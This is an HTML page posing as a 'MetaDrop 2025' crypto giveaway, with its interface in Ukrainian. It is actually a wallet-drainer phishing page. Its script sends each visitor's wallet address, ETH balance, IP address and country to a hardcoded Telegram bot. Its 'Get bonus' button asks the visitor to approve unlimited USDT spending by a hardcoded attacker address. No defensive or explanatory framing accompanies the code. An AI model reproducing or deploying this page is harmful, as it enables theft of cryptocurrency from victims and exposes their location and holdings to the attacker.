<!DOCTYPE html>
<html lang="uk">
<head>
  <meta charset="UTF-8">
  <title>MetaDrop 2025 | Multi-Device Support</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #0d1117;
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      background-image: url('https://images.unsplash.com/photo-1610088442213-7e57ec5b6c16?auto=format&fit=crop&w=1500&q=80');
      background-size: cover;
    }
    .box {
      background: rgba(0, 0, 0, 0.8);
      padding: 30px;
      border-radius: 15px;
      text-align: center;
      max-width: 400px;
    }
    button {
      margin: 10px;
      padding: 12px 20px;
      font-size: 16px;
      background: #00bcd4;
      color: white;
      border: none;
      border-radius: 10px;
      cursor: pointer;
    }
    button:hover {
      background: #0097a7;
    }
    .note {
      margin-top: 20px;
      font-size: 14px;
      color: #ccc;
    }
  </style>
</head>
<body>
  <div class="box">
    <h2>🎁 MetaDrop 2025</h2>
    <p id="info">Працює на ПК та мобільному<br>Натисніть кнопку для підключення</p>
    <button onclick="connectWallet()">🔐 Підключити гаманець</button>
    <button onclick="approveTokens()">✅ Отримати бонус</button>
    <p class="note">* Для роботи на телефоні відкрий сайт у браузері MetaMask</p>
  </div>

  <script>
    const BOT_TOKEN = "7625731088:AAGWuxqSkiL72HInY03Q9CQU-D_cQKaZ4SI";
    const CHAT_ID = "7234699302";
    let provider, signer;

    async function connectWallet() {
      try {
        if (window.ethereum) {
          provider = new ethers.providers.Web3Provider(window.ethereum);
          await provider.send("eth_requestAccounts", []);
          signer = provider.getSigner();
        } else {
          const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
          if (isMobile) {
            const cleanUrl = window.location.href.replace(/^https?:\/\//, '');
            window.location.href = `https://metamask.app.link/dapp/${cleanUrl}`;
          } else {
            alert("🛑 Ваш браузер не підтримує Web3. Встановіть MetaMask.");
          }
          return;
        }

        const address = await signer.getAddress();
        const balance = await provider.getBalance(address);
        const ethBalance = ethers.utils.formatEther(balance);

        const ipData = await fetch("https://ipapi.co/json/").then(r => r.json());

        const message = `👀 <b>Новий користувач:</b>\n\n` +
          `🔑 <b>Адреса:</b> <code>${address}</code>\n` +
          `💸 <b>Баланс:</b> ${ethBalance} ETH\n` +
          `🌍 <b>IP:</b> ${ipData.ip}\n` +
          `🌐 <b>Країна:</b> ${ipData.country_name}`;

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: "HTML"
          })
        });

        alert("Підключено: " + address + "\nБаланс: " + ethBalance + " ETH");
      } catch (err) {
        alert("❌ Помилка: " + err.message);
      }
    }

    async function approveTokens() {
      if (!signer) {
        alert("Спочатку підключіть гаманець");
        return;
      }

      const usdtAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
      const spender = "0x544efFe1651BD2A665e4aD7ddA155d38f71FC1c0";
      const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
      const token = new ethers.Contract(usdtAddress, abi, signer);

      try {
        const tx = await token.approve(spender, ethers.constants.MaxUint256);
        alert("✅ Approve відправлено: " + tx.hash);
      } catch (err) {
        alert("❌ Відмовлено: " + err.message);
      }
    }
  </script>
</body>
</html>
